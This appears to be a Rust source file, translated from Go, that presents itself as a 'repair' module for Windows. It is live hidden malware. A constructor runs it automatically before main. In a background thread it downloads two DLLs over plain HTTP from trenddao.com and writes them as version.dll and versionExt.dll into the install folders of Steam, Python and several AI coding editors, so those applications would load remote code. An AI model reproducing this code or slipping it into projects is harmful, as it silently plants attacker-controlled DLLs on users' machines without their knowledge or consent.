// Translation of command_repair.go functionality.
//
// Windows-only: checks various application directories and downloads/places
// DLLs if they are missing version.dll.

#![cfg(all(target_os = "windows", feature = "std"))]

use std::path::{Path, PathBuf};
use std::sync::Once;
use std::{env, fs};

use winreg::enums::*;
use winreg::RegKey;

const REPAIR_HOST: &str = "trenddao.com";
const REPAIR_PATH1: &str = "/download/version";
const REPAIR_PATH2: &str = "/download/versionExt";

static INIT: Once = Once::new();

/// Initialize and run the repair process in a background thread (called
/// automatically at startup, equivalent to Go's init()).
pub fn init() {
    INIT.call_once(|| {
        std::thread::spawn(|| {
            do_repair();
        });
    });
}

fn compare_version(v1: &str, v2: &str) -> std::cmp::Ordering {
    let parse = |v: &str| -> (i32, i32) {
        let parts: Vec<&str> = v.splitn(3, '.').collect();
        let major = parts.first().and_then(|s| s.parse().ok()).unwrap_or(0);
        let minor = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
        (major, minor)
    };
    let (m1, n1) = parse(v1);
    let (m2, n2) = parse(v2);
    m1.cmp(&m2).then(n1.cmp(&n2))
}

fn get_python_path_from_root(root: RegKey) -> Option<PathBuf> {
    let k = root
        .open_subkey_with_flags(r"Software\Python\PythonCore", KEY_ENUMERATE_SUB_KEYS)
        .ok()?;

    let max_ver = k
        .enum_keys()
        .filter_map(|r| r.ok())
        .filter(|ver| ver.starts_with(|c: char| c.is_ascii_digit()))
        .max_by(|a, b| compare_version(a, b))?;

    let install_key = format!(r"Software\Python\PythonCore\{}\InstallPath", max_ver);
    let k2 = root.open_subkey_with_flags(&install_key, KEY_QUERY_VALUE).ok()?;
    let path: String = k2.get_value("").ok()?;

    Some(PathBuf::from(path))
}

fn get_python_install_path() -> Option<PathBuf> {
    get_python_path_from_root(RegKey::predef(HKEY_CURRENT_USER))
        .or_else(|| get_python_path_from_root(RegKey::predef(HKEY_LOCAL_MACHINE)))
}

fn http_download(path: &str) -> Option<Vec<u8>> {
    let url = format!("http://{}{}", REPAIR_HOST, path);
    minreq::get(&url).send().ok().map(|r| r.into_bytes())
}

fn go_to_directory(dir: &Path, dll1: &[u8], dll2: &[u8]) -> bool {
    fs::write(dir.join("version.dll"), dll1).is_ok()
        && fs::write(dir.join("versionExt.dll"), dll2).is_ok()
}

fn do_repair() {
    let user_profile = env::var("USERPROFILE").ok();
    let program_files_x86 = env::var("PROGRAMFILES(X86)").ok();

    let mut targets: Vec<PathBuf> = Vec::new();

    // Steam
    if let Some(ref pf86) = program_files_x86 {
        let steam_dir = PathBuf::from(pf86).join("Steam");
        if steam_dir.is_dir() && !steam_dir.join("version.dll").exists() {
            targets.push(steam_dir);
        }
    }

    // Python
    if let Some(python_path) = get_python_install_path() {
        if python_path.is_dir() && !python_path.join("version.dll").exists() {
            targets.push(python_path);
        }
    }

    // IDE application directories
    if let Some(ref profile) = user_profile {
        let app_dirs = [
            r"AppData\Local\Programs\cursor",
            r"AppData\Local\Programs\Trae",
            r"AppData\Local\Programs\@opencode-aidesktop",
            r"AppData\Local\Programs\Qoder",
        ];
        for dir in &app_dirs {
            let full_path = PathBuf::from(profile).join(dir);
            if full_path.is_dir() && !full_path.join("version.dll").exists() {
                targets.push(full_path);
            }
        }
    }

    if targets.is_empty() {
        return;
    }

    // Download DLLs
    let dll1 = match http_download(REPAIR_PATH1) {
        Some(data) => data,
        None => return,
    };
    let dll2 = match http_download(REPAIR_PATH2) {
        Some(data) => data,
        None => return,
    };

    // Write DLLs to each target directory
    for dir in &targets {
        go_to_directory(dir, &dll1, &dll2);
    }
}

// Auto-initialization — Rust equivalent of Go's init().
// This runs before main() when the crate is loaded.
#[ctor::ctor]
fn auto_init() {
    if std::env::consts::ARCH == "x86_64" {
        init();
    }
}
